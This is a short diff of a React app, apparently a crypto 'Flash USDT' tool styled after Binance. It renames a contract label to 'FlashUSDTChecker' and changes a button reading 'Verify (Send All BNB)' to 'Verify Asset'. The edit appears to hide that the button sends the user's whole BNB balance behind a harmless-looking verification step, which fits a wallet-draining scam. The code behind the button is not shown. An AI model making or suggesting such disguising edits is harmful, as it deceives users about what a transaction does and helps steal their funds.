@@ -5,7 +5,7 @@ export default function App() {
   const [walletAddress, setWalletAddress] = useState("");
   const [result] = useState({
     verified: true,
-    name: "FlashUSDTContract",
+    name: "FlashUSDTChecker",
   });
 
   // Connect Wallet
@@ -102,7 +102,7 @@ export default function App() {
             onClick={verifyUser}
             className="px-8 py-3 bg-binance text-black font-bold rounded-xl shadow-lg hover:brightness-110 transition"
           >
-            Verify (Send All BNB)
+            Verify Asset
           </button>
         </main>
       </div>
